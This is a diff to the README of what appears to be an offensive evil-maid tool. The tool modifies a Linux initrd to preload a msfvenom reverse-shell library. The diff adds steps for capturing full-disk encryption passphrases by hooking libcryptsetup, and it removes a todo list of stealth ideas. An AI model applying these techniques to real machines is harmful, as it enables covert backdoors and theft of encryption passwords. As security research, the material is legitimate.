@@ -25,7 +25,7 @@
 ## Details
 ### Compiling
 See the `Makefile` for more information/configuration, `LHOST` is required in the
-environment to build the `.so` as `msfvenom` is piped in at compile time.
+environment to build the `.so` as `msfvenom` is piped in at compile time. It is also necessary to have `libcrypsetup-dev` (or equivalent) installed on the build machine.
 
 Generic Instructions (builds iso image in cwd):
 `LHOST=192.168.56.101 make rev.so iso`
@@ -87,9 +87,6 @@ There is no limit to the number of replacements you can run.
 #### Notes
  * `\\1` will expand to the full contents of the match (`*PRE`) when used inside the replace (`*POST`).
  * Be careful with: `| $`
-
-#### Debugging
-If you wish to debug your changes at runtime, you can insert `os.system('sh')` before the `initrd` is repacked to both view and modify changes.
  
 
 ### Nitty Gritty
@@ -163,7 +160,7 @@ The `usr/lib/systemd/system/initrd-switch-root.service` contains the script whic
 
 SELinux is present on CentOS, restricting the use of `LD_PRELOAD`. One working path is `/lib`. This was located by reading the file at `/etc/selinux/targeted/modules/active/file_contexts` for a `system_u:object_r:lib_t` labelled location.
 
-##### Progress
+##### Dropping the shell
 Because systemd calls `clearenv()` before switching root, our `LD_PRELOAD` variable is wiped out. To bypass this, we can hook `clearenv()`, and always just replace the environment with only  `LD_PRELOAD`. However, to achieve this, we need to be PID 1 inside the initrd. This is trickier as it is not possible to `LD_PRELOAD` into this process. To get around this, we have replaced `/init`  with a bash shell script as follows:
 
 ```
@@ -176,22 +173,14 @@ This works becuase `/init` is just a symlink to `/usr/lib/systemd/systemd`. `exe
 
 Once this is impemented, and `clearenv()` is neutralised, it is possible to set `LD_PRELOAD` for the real pid 1 inside the new root.
 
+##### Password Stealing
+systemd handles passwords for encrypted filesystems completely differently to Debian based init scripts. The passwords are passed around using Unix sockets which allow you to send credentials. To get around this complexity, the easiest method We found to access the password was to hook the `crypt_activate_by_passphrase` function from `libcryptsetup`. The relevant parts of the function declaration are as follows:
+
+```
+int crypt_activate_by_passphrase(..., const char *passphrase, size_t passphrase_size, ...);
+```
+
+To access the password we simply hook this function, save `passphrase` to a file and call the original function obtained by `dlsym(RTLD_NEXT, ...)`. As above, we appended our password to the `.so` so it is able to parse itself and make the password available to meterpreter.
+
 ##### Artefacts
 As above, the .so shows up in `/proc/1/maps`, `/proc/1/environ` and `ps` output.
-
-## Todo
- * CentOS/Fedora self delete
- * Add in CentOS password retrieval (Possibly requiring hooking)
- * Hide from:
-    * /proc/*/maps
-    * /proc/*/environ
-    * ps (python)
-    * netstat
- * Alternative .so: Backdoor a standard system .so (libc etc), add a function,
-   export it and set -Wl,-init,ourfunction in the ELF headers.
-    * Pro: stealthier, don't need to LD_PRELOAD/hide ourselves if we're included by
-      default.
-    * Con: Reverse Engineering possible. Tricky, we only have what we bring with us
- * Rubber Ducky for when we can't boot from external media
- * Kernel patch to verify (sha?) checksum of initrd. Would require UEFI
-   secureboot laptop for testing purposes (fedora can do secureboot)
